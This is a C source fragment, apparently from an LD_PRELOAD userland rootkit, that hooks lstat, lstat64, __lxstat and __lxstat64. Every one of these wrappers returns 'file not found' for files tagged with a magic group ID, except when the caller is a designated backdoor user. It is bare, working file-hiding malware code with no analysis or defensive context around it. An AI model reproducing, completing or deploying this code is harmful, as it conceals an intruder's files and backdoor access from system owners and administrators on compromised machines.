int lstat(const char *pathname, struct stat *buf)
{
    HOOK(o_lstat,CLSTAT);
    if(is_bdusr()) return o_lstat(pathname,buf);
    if(hxstat(pathname,MGID,32)) { errno=ENOENT; return -1; }
    return o_lstat(pathname,buf);
}

int lstat64(const char *pathname, struct stat64 *buf)
{
    HOOK(o_lstat64,CLSTAT64);
    if(is_bdusr()) return o_lstat64(pathname,buf);
    if(hxstat(pathname,MGID,64)) { errno=ENOENT; return -1; }
    return o_lstat64(pathname,buf);
}

int __lxstat(int version, const char *pathname, struct stat *buf)
{
    HOOK(o_lxstat,C__LXSTAT);
    if(is_bdusr()) return o_lxstat(version,pathname,buf);
    if(hxstat(pathname,MGID,32) || hlxstat(pathname,MGID,32)) { errno=ENOENT; return -1; }
    return o_lxstat(version,pathname,buf);
}

int __lxstat64(int version, const char *pathname, struct stat64 *buf)
{
    HOOK(o_lxstat64,C__LXSTAT64);
    if(is_bdusr()) return o_lxstat64(version,pathname,buf);
    if(hxstat(pathname,MGID,64) || hlxstat(pathname,MGID,64)) { errno=ENOENT; return -1; }
    return o_lxstat64(version,pathname,buf);
}
